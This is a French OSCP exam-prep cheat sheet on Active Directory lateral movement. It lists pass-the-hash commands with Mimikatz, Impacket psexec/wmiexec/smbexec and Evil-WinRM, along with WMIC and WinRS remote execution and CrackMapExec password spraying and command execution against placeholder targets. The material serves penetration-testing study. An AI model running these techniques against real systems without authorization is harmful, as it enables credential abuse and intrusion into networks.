---
title: "OSCP · Active Directory : mouvement latéral"
description: "Référence des accès distants et protocoles entre hôtes Windows."
---

# OSCP · Active Directory : mouvement latéral

Référence des accès distants et protocoles entre hôtes Windows.

## Techniques et préparation

<p class="oscp-command-note">PowerShell : charger ou exécuter l'outil concerné par «Techniques et préparation».</p>

```powershell
powershell -ExecutionPolicy Bypass -File [script].ps1

```

<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<NTLM_hash> /run:powershell

# Vous pouvez alors exécuter des commandes dans la session PowerShell comme si vous étiez connecté comme l'autre utilisateur, par exemple ici, nous passons à un autre système comme l'autre utilisateur et exécutant un shell:
.\PsExec.exe \\<target_system> cmd

```

### Evil-WinRM

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">Se connecter à Windows via WinRM.</p>

```bash
evil-winrm -u <username> -p <password> -i <target_ip>

```

```bash
# Utilisez l'option -S pour ignorer la validation SSL pour les systèmes non sécurisés.
evil-winrm -i <target_ip> -u <username> -H <LM_hash>:<NTLM_hash>
# or
evil-winrm -i <target_ip> -u <username> -H 00000000000000000000000000000000:<NTLM_hash>

```

#### Tester WinRM avant la connexion

Depuis un poste Windows, interroger le service WS-Management sans ouvrir de session distante.

<p class="oscp-command-note">Tester WinRM avant la connexion.</p>

```powershell
Test-WSMan -ComputerName <NOM_CIBLE>
```

#### WinRM chiffré

Se connecter au point de terminaison HTTPS lorsque le certificat et les règles du service sont correctement configurés.

<p class="oscp-command-note">WinRM chiffré.</p>

```bash
evil-winrm -i <IP_CIBLE> -S -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>'
```

### PsExec

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```bash
impacket-psexec <username>:<password>@<target_ip>

```

```bash
impacket-psexec <username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>
# or
impacket-psexec <username>@<target_ip> -hashes 00000000000000000000000000000000:<NTLM_hash>

```

### VMIExec

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```bash
impacket-wmiexec <username>:<password>@<target_ip>

```

```bash
impacket-wmiexec -hashes <LM_hash>:<NTLM_hash> <username>@<target_ip>
# or
impacket-wmiexec -hashes 00000000000000000000000000000000:<NTLM_hash> <username>@<target_ip>

```

## Depuis Windows

Observer les permissions et la configuration de Windows.

### DCOM (modèle d’objets distribués)

<p class="oscp-command-note">Lire une clé du Registre Windows.</p>

```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\OLE" -Name "DCOMServer"

```

**Paramètres et repères :**
`Invoke-Command`  

<p class="oscp-command-note">DCOM : définir l'adresse, le compte et les paramètres de connexion à la machine cible.</p>

```powershell
$targetIP = "<target_ip>"  # Replace with the actual target IP
$username = "<username>"    # Replace with the actual username
$password = "<password>"     # Replace with the actual password
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $secureString)

Invoke-Command -ComputerName $targetIP -Credential $credential -ScriptBlock { ipconfig }

```

**Paramètres et repères :**
`vmiexec`  

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```bash
wmiexec.py <domain>/<username>:<password>@<target_ip>
# or
wmiexec.py <domain>/<username>@<target_ip> -hashes <LM_hash>:<NTLM_hash>

```

### PsExec

```bash
psexec.exe \\<target_ip> -u <username> -p <password> cmd

```

### WinRM

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">WinRM : préparer les identifiants utilisés pour établir une session distante.</p>

```powershell
$username = '<username>';
$password = '<password>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <target_ip> -Credential $credential;

```

### WinRS

```powershell
winrs -r:<target_ip> -u:<username> -p:<password> "<command>"

```

#### Exécuter une commande d'inventaire WinRS

Exécuter une commande simple sur un poste déjà administrable, avec un compte autorisé.

<p class="oscp-command-note">WinRM : ouvrir une session distante avec le compte de test.</p>

```powershell
winrs -r:<NOM_CIBLE> -u:<UTILISATEUR> -p:<MOT_DE_PASSE> hostname
```

### WMIC

<p class="oscp-command-note">Interroger les informations système via WMI.</p>

```powershell
wmic /node:<target_ip> /user:<username> /password:<password> process call create "<command>"

```

## Pulvérisation de mots de passe (Password Spraying) avec CrackMapExec

Vérifier les comptes, les secrets et les mécanismes d'authentification.

### Précautions pour le password spraying

Vérifier les comptes, les secrets et les mécanismes d'authentification.

**Paramètres et repères :**
`--delay` (délai) · `--max-retries` (limite des tentatives)  

<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
# Vérifier les politiques avec un outil comme rpcclient
rpcclient -U "" <DOMAIN_IP> -c "getdompwinfo"

# Tester plusieurs mots de passe avec un délai pour éviter les lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5

# Tester plusieurs mots de passe avec une limite maximale de retraits pour éviter les lockouts
crackmapexec smb <TARGET_IP> -u users.txt -p passwords.txt --max-retries 3

```

<p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec CrackMapExec.</p>

```bash
# Utilisez l'option --target de CrackMapExec pour réduire la focalisation
crackmapexec smb <TARGET_IP> --target-ips subdomains.txt -u users.txt -p passwords.txt

```

**Paramètres et repères :**
`--local-auth` (authentification locale)  

```bash
# Vérifier l'accès SMB
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> > output.log

```

```bash
# Vérifier l'accès SMB
crackmapexec smb <IP_list>.txt -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

```

```bash
# Énumérer les comptes accessibles
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> --users

```

```bash
# Examiner le service avec CrackMapExec
crackmapexec rdp <TARGET_IP> -u users.txt -p <PASSWORD>

```

<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -p 5985,1433,445,3389 <TARGET_IP>

```

**Paramètres et repères :**
`-p` · `-H`  

<p class="oscp-command-note">Tester une authentification par hash NTLM sur SMB avec CrackMapExec.</p>

```bash
# Tester les mots de passe et les hachages NTLM
crackmapexec smb <DOMAIN_IP> -u users.txt -p passwords.txt -H hashes.txt -d <DOMAIN_NAME>

```

### SMB

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Tester un mot de passe sur plusieurs comptes via SMB, selon la politique de verrouillage.</p>

```bash
# Tester un mot de passe unique pour tous les utilisateurs du domaine
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p <PASSWORD> --spray --delay 5

# Tester plusieurs mots de passe avec un délai pour éviter les lockouts
crackmapexec smb <DOMAIN_IP> -d <DOMAIN_NAME> -u users.txt -p passwords.txt --spray --delay 5

```

```bash
# Énumérer les sous-domaines avec des identifiants valides et des identifiants de test (par exemple un domaine spécifique à la station de travail, comme station de travail1.domain.com)
crackmapexec smb <SUBDOMAIN_IP> -d <SUBDOMAIN_NAME> -u users.txt -p <PASSWORD>

```

```bash
# Tester les références sur les comptes locaux qui ne font pas partie du domaine
crackmapexec smb <IP> -u local_users.txt -p <PASSWORD> --local-auth

```

```bash
# Exécuter une commande sur une machine distante avec des identifiants valides
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Avec le hash NTLM
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"

```

#### Vérifier les partages administratifs

Lister les partages accessibles sans supposer que la présence de C$ autorise une connexion.

<p class="oscp-command-note">Vérifier les partages administratifs.</p>

```powershell
net view \\<NOM_CIBLE>
```

#### Monter un partage avec un compte de test

Créer une connexion SMB vers une ressource autorisée, sans persistance.

<p class="oscp-command-note">Monter un partage avec un compte de test.</p>

```powershell
net use \\<NOM_CIBLE>\<PARTAGE> /user:<DOMAINE>\<UTILISATEUR> *
```

### WinRM (administration distante Windows)

Observer les permissions et la configuration de Windows.

<p class="oscp-command-note">Tester un mot de passe sur plusieurs comptes via WINRM, selon la politique de verrouillage.</p>

```bash
# Tester les références sur le domaine principal via WinRM
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --spray --delay 5

# Essai du hachage NTLM
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --spray --delay 5

# Exécuter une commande
crackmapexec winrm <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

```

```bash
# Énumérer les sous-domaines avec des identifiants valides et des identifiants de test (par exemple un domaine spécifique à la station de travail, comme station de travail1.domain.com). Authentifier sur un sous-domaine
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Avec le hash NTLM
crackmapexec winrm <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>

```

```bash
# Authentifier avec un compte utilisateur local
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Avec le hash NTLM
crackmapexec winrm <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth

```

```bash
# Exécuter une commande à distance
crackmapexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "ipconfig"

# Avec un hash NTLM
crackmapexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "ipconfig"

```

### Mouvement latéral via SMB avec PsExec

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Spécifier la méthode d'exécution distante SMB avec CrackMapExec (droits requis).</p>

```bash
# Gagnez un shell en utilisant des identifiants valides
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method smbexec

# Ouvrir une session en utilisant un hash NTLM
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method smbexec

```

```bash
# Exécuter une commande distante
crackmapexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> -x "whoami"

# Avec un hash NTLM
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> -x "whoami"

```

### VMIExec

<p class="oscp-command-note">Spécifier la méthode d'exécution distante SMB avec CrackMapExec (droits requis).</p>

```bash
# Gagnez un shell en utilisant des identifiants valides
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --exec-method wmiexec

# Ouvrir une session en utilisant un hash NTLM
crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME> --exec-method wmiexec

```

### LDAP (protocole d’annuaire)

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Tester les identifiants fournis sur le service LDAP avec CrackMapExec.</p>

```bash
# Authentifier et énumérer les utilisateurs sur le domaine principal
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Avec le hash NTLM
crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>

```

```bash
# Énumérer les utilisateurs sur un sous-domaine
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Avec le hash NTLM
crackmapexec ldap <SUBDOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>

```

### MSSQL (Microsoft SQL Server)

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Tester les identifiants fournis sur le service MSSQL avec CrackMapExec.</p>

```bash
# Tester les identifiants de domaine principal sur un serveur MSSQL
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Avec le hash NTLM
crackmapexec mssql <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>

```

```bash
# Tester les références sur un serveur sous-domaine MSSQL
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Avec le hash NTLM
crackmapexec mssql <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>

```

```bash
# Tester les identifiants des utilisateurs locaux sur MSSQL
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Avec le hash NTLM
crackmapexec mssql <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth

```

### RDP

<p class="oscp-command-note">Tester les identifiants fournis sur le service RDP avec CrackMapExec.</p>

```bash
# Tester les références d'un service RDP sur le domaine principal
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME>

# Avec le hash NTLM
crackmapexec rdp <DOMAIN_CONTROLLER_IP> -u <USERNAME> -H <NTLM_HASH> -d <DOMAIN_NAME>

```

```bash
# Tester les références sur un service RDP dans un sous-domaine
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -p <PASSWORD> -d <SUBDOMAIN_NAME>

# Avec le hash NTLM
crackmapexec rdp <SUBDOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> -d <SUBDOMAIN_NAME>

```

```bash
# Authentifier à RDP avec les identifiants locaux
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -p <PASSWORD> --local-auth

# Avec le hash NTLM
crackmapexec rdp <TARGET_IP> -u <LOCAL_USER> -H <NTLM_HASH> --local-auth

```

#### Accès RDP avec résolution dynamique

Utiliser FreeRDP 3 pour ouvrir une session graphique autorisée.

<p class="oscp-command-note">Accès RDP avec résolution dynamique.</p>

```bash
xfreerdp3 /u:<UTILISATEUR> /v:<IP_CIBLE> /dynamic-resolution
```

### FTP

Transférer ou récupérer des fichiers dans le laboratoire.

<p class="oscp-command-note">Tester les identifiants fournis sur le service FTP avec CrackMapExec.</p>

```bash
crackmapexec ftp <TARGET_IP> -u <USERNAME> -p <PASSWORD>

```

### SSH

<p class="oscp-command-note">Tester les identifiants fournis sur le service SSH avec CrackMapExec.</p>

```bash
crackmapexec ssh <TARGET_IP> -u <USERNAME> -p <PASSWORD>

```

#### Exécuter une commande distante en SSH

Éviter d'ouvrir un shell interactif lorsque la collecte requiert une seule commande.

<p class="oscp-command-note">SSH : exécuter hostname sur le serveur distant sans ouvrir de terminal interactif.</p>

```bash
ssh <UTILISATEUR>@<HOTE_SSH> hostname
```

### HTTP

Examiner les entrées et les réponses de l'application web.

<p class="oscp-command-note">HTTP : tester l'authentification annoncée par le serveur avec curl (non pris en charge par CrackMapExec).</p>

```bash
curl --anyauth -u '<USERNAME>:<PASSWORD>' -I http://<TARGET_IP>/

```

## Variantes WinRM et exécution distante

Distinguer les protocoles et les modes d'authentification. Ces exemples supposent que les droits sur la machine et les services ont été validés dans le périmètre d'audit.

### WinRM avec un certificat client

Utiliser le certificat et la clé d'un compte autorisé si WinRM TLS accepte cette forme d'authentification.

<p class="oscp-command-note">WinRM avec un certificat client.</p>

```bash
evil-winrm -i <IP_CIBLE> -S -c <CERTIFICAT_CLIENT>.pem -k <CLE_PRIVEE>.pem
```

### Scripts locaux dans Evil-WinRM

Déclarer un répertoire de scripts PowerShell à charger dans la session distante.

<p class="oscp-command-note">Scripts locaux dans Evil-WinRM.</p>

```bash
evil-winrm -i <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' -s <DOSSIER_SCRIPTS>
```

### Comparer SMBExec et WMIExec

Les outils Impacket disposent de mécanismes d'exécution distincts : tester uniquement le protocole autorisé.

<p class="oscp-command-note">Comparer SMBExec et WMIExec.</p>

```bash
impacket-smbexec '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>'
impacket-wmiexec '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>'
```

**Référence complémentaire :** [Notes de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/20_ad_lateral_mov.md). Synthèse rédigée pour SKILL-ISSUE.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
